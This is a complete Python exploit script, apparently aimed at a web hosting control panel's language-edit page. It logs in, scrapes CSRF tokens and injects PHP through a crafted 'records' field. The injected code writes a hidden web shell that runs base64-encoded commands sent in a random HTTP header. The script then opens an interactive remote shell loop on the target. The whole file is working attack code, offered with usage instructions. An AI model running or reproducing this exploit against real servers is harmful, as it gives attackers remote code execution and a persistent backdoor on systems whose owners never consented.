import sys
import base64
import random
import string
import requests

# URL format check
def url_format_check(url):
    if not(url.startswith('http://') or url.startswith('https://')):
        raise ValueError('URL should start with http:// or https://')
    
    if not url.endswith('/'):
        return url + '/'

# Prepare session
def prepare_session(proxy):
    session = requests.Session()
    session.verify = False

    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }

        session.proxies = proxies

    return session

# Login function
def login(session, url, username, password):
    login_url = url + '/login/'

    data = {
        'username': username,
        'password': password
    }

    response = session.post(login_url, data=data)

    if 'Username or Password wrong' in response.text:
        raise ValueError("Username or Password wrong. Please check the credentials and try again.")

# Get CSRF token
def get_csrf_token(session, url):
    language_url = url + '/admin/language_edit.php?lang_file=en_domain_list.lng&module=client&lang=en'
    
    response = session.get(language_url)
    
    _csrf_id = response.text.split('_csrf_id" value="')[1].split('"')[0]
    _csrf_key = response.text.split('_csrf_key" value="')[1].split('"')[0]
    
    return _csrf_id, _csrf_key

# Exploit function
def exploit(session, url, _csrf_id, _csrf_key):
    exploit_url = url + '/admin/language_edit.php'
   
    random_header = ''.join(random.choices(string.ascii_uppercase, k=4))
    http_request_header = "HTTP_" + random_header
    php_code = f"<?php passthru(base64_decode($_SERVER['{http_request_header}']));?>"
    php_code_encoded = base64.b64encode(php_code.encode()).decode()
    php_file_name = ''.join(random.choices(string.ascii_letters,k=8)) + '.php'

    injection_payload = f"'];file_put_contents('{php_file_name}',base64_decode('{php_code_encoded}'));die;#"

    lang_file = ''.join(random.choices(string.ascii_letters,k=8)) + '.lng'

    data = {
        'lang': 'en',
        'module': 'help',
        'lang_file': lang_file,
        '_csrf_id': _csrf_id,
        '_csrf_key': _csrf_key,
        'records[\\]': injection_payload
    }

    response = session.post(exploit_url, data=data)
    
    if response.status_code == 200:
        print(f'Exploit successful. Backdoor created at /admin/{php_file_name}.php')
        shell(session, url, php_file_name, random_header)
    else:
        print('Payload was not uploaded to {}.'.format(url))

# Shell function
def shell(session, url, php_file_name, random_header):
    print(f'Launching Shell on {url}/admin/{php_file_name}')

    while True:
        try:
            cmd = input("\nshell#")
            if cmd.lower() == 'exit':
                break
            
            headers = {
                random_header : base64.b64encode(cmd.encode()).decode()
            }

            response = session.get(f'{url}/admin/{php_file_name}', headers=headers)
            print(response.text)
        except Exception as e:
            print(f'Error: {e}')

# Main function
# Usage: python3 exploit.py <base_url> <username> <password> <proxy>(optional)
if __name__ == '__main__':
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) 

    # Check if the correct number of arguments is provided
    if len(sys.argv) < 4:
        print(f'Usage: {sys.argv[0]} <url> <username> <password> <proxy>(optional)')
        sys.exit(1)
   
    url, username, password, proxy = sys.argv[1], sys.argv[2], sys.argv[3], None
    
    # Check URL format
    url = url_format_check(url)
   
    # If Proxy is provided
    if len(sys.argv) == 5:
        proxy = sys.argv[4]

    # Prepare session & get csrf token
    session = prepare_session(proxy)
    login(session, url, username, password)
    _csrf_id, _csrf_key = get_csrf_token(session, url)

    # Exploit vulnerability & return shell
    exploit(session, url, _csrf_id, _csrf_key)
